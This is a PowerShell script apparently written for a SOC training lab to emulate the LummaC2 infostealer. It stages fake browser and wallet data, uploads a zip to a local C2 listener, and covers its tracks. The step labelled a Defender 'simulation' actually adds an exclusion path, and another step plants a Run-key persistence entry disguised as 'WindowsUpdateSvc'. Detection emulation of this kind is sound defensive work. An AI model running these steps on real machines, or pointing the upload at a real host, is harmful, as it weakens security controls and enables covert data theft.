# ====== LUMMAC2 SIMULATION - SOC TRAINING LAB ======
# Simulates: Browser data theft → ZIP → PowerShell exfil → Persistence
# Triggers: RunMRU, Sysmon EID1/3/11, Elastic detections

# ====== CONFIGURATION ======
$C2_SERVER = "http://127.0.0.1/c2sock"  # Your local listener
$ZIP_PATH = "C:\Users\Public\system_lumma.zip"
$STAGE_DIR = "$env:TEMP\lumma_stage"

# ====== 1. DISABLE DEFENDER (SIMULATION) ======
Write-Host "[+] Simulating Defender exclusion..."
powershell "Set-MpPreference -ExclusionPath 'C:\Users\Public' -Force" -WindowStyle Hidden

# ====== 2. COLLECT BROWSER-LIKE DATA ======
Write-Host "[+] Collecting system inventory (LummaC2 System.txt)..."
$systemInfo = @"
ComputerName: $env:COMPUTERNAME
UserName: $env:USERNAME
OS: $(Get-WmiObject Win32_OperatingSystem).Caption
Domain: $env:USERDOMAIN
ProfilePath: $env:USERPROFILE
Browsers: Chrome, Firefox, Edge
Wallets: MetaMask, Exodus
"@

# Create fake Chrome files
$fakeChromeFiles = @(
    "C:\Users\Public\Desktop\Bookmarks.json",
    "C:\Users\Public\Desktop\LoginData.json", 
    "C:\Users\Public\Desktop\History.json"
)

foreach ($file in $fakeChromeFiles) {
    $systemInfo | Out-File -FilePath $file -Encoding UTF8
    Write-Host "  [+] Created: $file"
}

# ====== 3. ZIP DATA (LummaC2 staging) ======
Write-Host "[+] Staging data for exfiltration..."
New-Item -ItemType Directory -Force -Path $STAGE_DIR | Out-Null
Compress-Archive -Path $fakeChromeFiles -DestinationPath $ZIP_PATH -Force
Write-Host "  [+] Created: $ZIP_PATH"

# ====== 4. LUMMAC2 EXFIL (multipart POST to /c2sock) ======
Write-Host "[+] Exfiltrating to C2 ($C2_SERVER)..."
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Content-Type", "multipart/form-data")
    $webClient.UploadFile($C2_SERVER, $ZIP_PATH)
    Write-Host "  [+] Exfil SUCCESS"
} catch {
    Write-Host "  [!] Exfil failed (normal in lab)"
}

# ====== 5. PERSISTENCE (HKCU Run key) ======
Write-Host "[+] Establishing persistence..."
$scriptPath = $MyInvocation.MyCommand.Path
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" -Value "powershell -ep bypass -f '$scriptPath'" -PropertyType String -Force | Out-Null
Write-Host "  [+] Persistence via: WindowsUpdateSvc"

# ====== 6. CLEANUP TRACKS ======
Write-Host "[+] Cleaning tracks..."
Remove-Item $fakeChromeFiles -Force -ErrorAction SilentlyContinue
Write-Host "[+] LummaC2 simulation COMPLETE"
